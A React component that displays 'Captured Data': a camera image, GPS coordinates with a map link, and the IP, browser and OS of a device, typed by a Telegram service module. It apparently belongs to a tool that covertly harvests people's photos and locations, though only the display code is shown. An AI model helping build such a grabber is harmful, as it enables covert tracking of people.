"use client"

import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { MapPin, Camera, Monitor, Calendar, Globe } from "lucide-react"
import { CaptureData } from "@/services/telegram"

interface CaptureDataDisplayProps {
  data: CaptureData
}

export function CaptureDataDisplay({ data }: CaptureDataDisplayProps) {
  return (
    <Card className="bg-gray-900/50 backdrop-blur-sm border-gray-800">
      <CardHeader>
        <CardTitle className="text-xl gradient-text">Captured Data</CardTitle>
      </CardHeader>
      <CardContent>
        <div className="space-y-6">
          {/* Image */}
          <div className="space-y-2">
            <div className="flex items-center gap-2 text-red-400">
              <Camera className="h-5 w-5" />
              <span className="font-medium">Captured Image</span>
            </div>
            <div className="aspect-video bg-gray-800 rounded-lg overflow-hidden">
              <img
                src={data.image}
                alt="Captured"
                className="w-full h-full object-cover"
              />
            </div>
          </div>

          {/* Location */}
          <div className="space-y-2">
            <div className="flex items-center gap-2 text-red-400">
              <MapPin className="h-5 w-5" />
              <span className="font-medium">Location</span>
            </div>
            <div className="bg-gray-800 p-4 rounded-lg">
              <a
                href={`https://www.google.com/maps?q=${data.location.latitude},${data.location.longitude}`}
                target="_blank"
                rel="noopener noreferrer"
                className="text-blue-400 hover:text-blue-300"
              >
                View on Google Maps
              </a>
              <p className="text-gray-300 mt-2">
                Latitude: {data.location.latitude}
                <br />
                Longitude: {data.location.longitude}
              </p>
            </div>
          </div>

          {/* Device Info */}
          <div className="space-y-2">
            <div className="flex items-center gap-2 text-red-400">
              <Monitor className="h-5 w-5" />
              <span className="font-medium">Device Information</span>
            </div>
            <div className="bg-gray-800 p-4 rounded-lg space-y-2">
              <div className="flex items-center gap-2">
                <Globe className="h-4 w-4 text-gray-400" />
                <span className="text-gray-300">IP: {data.deviceInfo.ip}</span>
              </div>
              <div className="flex items-center gap-2">
                <Monitor className="h-4 w-4 text-gray-400" />
                <span className="text-gray-300">Browser: {data.deviceInfo.browser}</span>
              </div>
              <div className="flex items-center gap-2">
                <Monitor className="h-4 w-4 text-gray-400" />
                <span className="text-gray-300">OS: {data.deviceInfo.os}</span>
              </div>
              <div className="flex items-center gap-2">
                <Calendar className="h-4 w-4 text-gray-400" />
                <span className="text-gray-300">Time: {new Date(data.deviceInfo.timestamp).toLocaleString()}</span>
              </div>
            </div>
          </div>
        </div>
      </CardContent>
    </Card>
  )
} 